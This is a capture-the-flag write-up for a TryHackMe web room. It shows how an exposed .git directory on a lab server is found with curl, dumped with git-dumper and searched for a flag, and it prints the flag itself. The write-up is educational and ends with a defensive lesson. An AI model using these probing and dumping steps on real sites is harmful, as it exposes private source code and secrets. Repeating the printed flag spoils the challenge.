| Field | Detail |
|------|--------|
| **Platform** | TryHackMe |
| **Event** | Hacker Holidays 2026 — The Byte Lotus |
| **Day** | 2 |
| **Room** | Room 404 |
| **Category** | Web → Directory Enumeration |
| **Flag format** | THM{...} |

---

## Objective

**Room 404** is a web directory-enumeration challenge: the lab target is reachable on port `8080`, and a night-shift developer accidentally deployed the site's `.git/` directory to the public web root. The goal is to dump the exposed source code and recover the flag hidden inside the staging repository. Because the full Git history is exposed, the entire staging repo — `app.js`, `index.html`, and `README.md` — can be reconstructed with `git-dumper`, and the flag was left in the repo's `README.md` as a "staging flag (remove before launch)".

By the end of this room you will be able to:

- Confirm connectivity to a lab machine on a non-standard port (`8080`)
- Probe for an exposed `.git/` directory by requesting `/.git/HEAD`
- Reconstruct a full staging repository from an exposed `.git/` folder with **`git-dumper`**
- Search recovered source for a flag with `grep`
- Explain why deploying `.git` to a public web root leaks source and secrets

---

## Story Hook

_"port 8080 is wide open, and the rooms it never lists are the ones worth finding"_ + _"the night-shift developer shipped more than the website"_ → an exposed `.git` directory was deployed alongside the site.

---

## Attack Path

| **1** | **Confirm connectivity**<br>Confirmed target reachable on port 8080. |
| --- | --- |

| **2** | **Enumerate the web root**<br>Directory enumeration / probing revealed an exposed **`.git/`** folder (`/.git/HEAD` returned a ref). |
| --- | --- |

| **3** | **Dump the repository**<br>Dumped the repo with **`git-dumper`** → recovered the staging repository (`app.js`, `index.html`, `README.md`). |
| --- | --- |

| **4** | **Read the source**<br>Flag was left in the repo **`README.md`** as a "staging flag (remove before launch)". |
| --- | --- |

---

## Walkthrough

**1. Confirm connectivity to the lab machine** (VPN reachability from Kali-WSL):

```bash
$ ping -c 3 10.144.176.152
$ curl -I http://10.144.176.152:8080
```

**2. Enumerate the web root.** The story hint ("the rooms it never lists") points at hidden/unlinked paths. Directory brute-forcing missed the dotfolder at first (SecLists wordlist was not present — installed later with `sudo apt install -y seclists`), so the `.git` directory was found by probing it directly:

```bash
$ curl -s http://10.144.176.152:8080/.git/HEAD
# -> ref: refs/heads/master   (confirms an exposed Git repo)
```

**3. Dump the exposed repository** with `git-dumper`:

```bash
$ pipx install git-dumper        # or: pip install git-dumper
$ git-dumper http://10.144.176.152:8080/.git/ room404_src
```

**4. Read the recovered source** — the flag was left in the staging `README.md` ("remove before launch"):

```bash
$ grep -rniE 'thm\{' room404_src
# room404_src/README.md: Staging flag (remove before launch): THM{...}
```

**5. Submit** the recovered flag in the room's "What is the flag?" box. ✅

> **Note:** Local dump saved at `C:\Users\varun\Desktop\room404_src` (contains `.git`, `app.js`, `index.html`, `README.md`).

---

## Flag

> **🚩 Flag**
> `THM{byt3_l0tus_n3v3r_f0rg3ts}`

---

## Recovered repo contents

| File | Purpose |
|---|---|
| `README.md` | Staging notes — **contained the flag** |
| `index.html` | Guest-experience platform front page |
| `app.js` | Concierge personalization client script |
| `.git/` | Full version history that made the source recoverable |

---

## Key Takeaways

- Never deploy the `.git` directory to a public web root — it lets anyone reconstruct full source (and secrets) via `git-dumper`.

---

## Final Takeaway

Room 404 is a textbook **exposed `.git` directory** exposure: a target on port `8080` shipped its version-control folder to the public **web root**, so a single probe of `/.git/HEAD` confirmed the repo and **`git-dumper`** reconstructed the entire staging repository. The recovered **`README.md`** held a "staging flag (remove before launch)" — a reminder that **directory enumeration** plus source recovery turns a careless deploy into full **source disclosure**. The defence is simple: keep `.git` out of anything served to the internet.

---
*Adapted from the [Hacker Holidays 2026 findings log](https://github.com/Varun-Patkar/HackerHolidays) by Varun Anand Patkar (MIT License).*
